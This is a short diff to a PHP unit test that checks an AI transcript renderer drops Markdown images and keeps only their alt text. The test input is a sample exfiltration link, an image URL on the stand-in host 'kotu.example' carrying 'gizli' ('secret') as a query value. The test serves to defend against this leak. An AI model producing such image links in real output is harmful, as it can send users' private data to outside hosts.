@@ -460,5 +460,10 @@ class SerfexAiTest extends TestCase
 
         $this->assertStringContainsString('<table>', $html);
         $this->assertStringNotContainsString('<img', $html);
+
+        // Markdown images keep only their text: nothing is loaded.
+        $html = Transcript::markdown('Bakın: ![CPU grafiği](https://kotu.example/?d=gizli)');
+        $this->assertStringNotContainsString('kotu.example', $html);
+        $this->assertStringContainsString('Bakın: CPU grafiği', $html);
     }
 }
